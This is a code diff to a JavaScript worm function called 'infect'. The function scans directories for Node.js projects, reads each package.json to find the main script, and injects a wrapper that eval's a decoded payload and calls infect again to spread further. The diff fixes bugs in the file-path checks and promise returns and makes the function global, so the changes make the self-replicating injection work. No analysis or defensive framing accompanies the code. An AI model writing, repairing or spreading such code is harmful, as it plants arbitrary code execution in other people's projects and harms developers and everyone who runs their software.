@@ -1,4 +1,4 @@
-function infect( payload ) { // eslint-disable-line
+global.infect = function( payload ) { 
 
     const fs   = require( "fs" );
     const os   = require( "os" );
@@ -8,11 +8,11 @@ function infect( payload ) { // eslint-disable-line
     // this is the string that will be injected into our targets
 
     const modifiedPayload = `
-        (function() {
-            var payload = "${payload}";
-            eval(decodeURI(payload));
-            infect( payload );
-        })();
+(function() {
+    var payload = "${payload}";
+    eval(decodeURI(payload));
+    global.infect( payload );
+})();
     `;
 
     function readdir( dir ) {
@@ -65,7 +65,7 @@ function infect( payload ) { // eslint-disable-line
                                 return [];
                         
                             var pkgPath = path.join( full, "package.json" );
-                            stat( pkgPath ).then( function( res ) {
+                            return stat( pkgPath ).then( function( res ) {
 
                                 // check if child directory has a package.json - if not, recursively scan the child
                                 if( res !== "file" )
@@ -76,8 +76,8 @@ function infect( payload ) { // eslint-disable-line
                                     // load the package.json and find the main script (being index.js if not specified)
                                     var main     = JSON.parse( res ).main || "index.js";
                                     var mainPath = path.join( full, main );
-
-                                    return stat( main ).then( function( res ) {
+                                    
+                                    return stat( mainPath ).then( function( res ) {
 
                                         // if the main script exists, return it as a valid project main, otherwise return nothing...
                                         if( res === "file" )
@@ -107,4 +107,5 @@ function infect( payload ) { // eslint-disable-line
                 }); 
         }));
     });
-}
+};
+
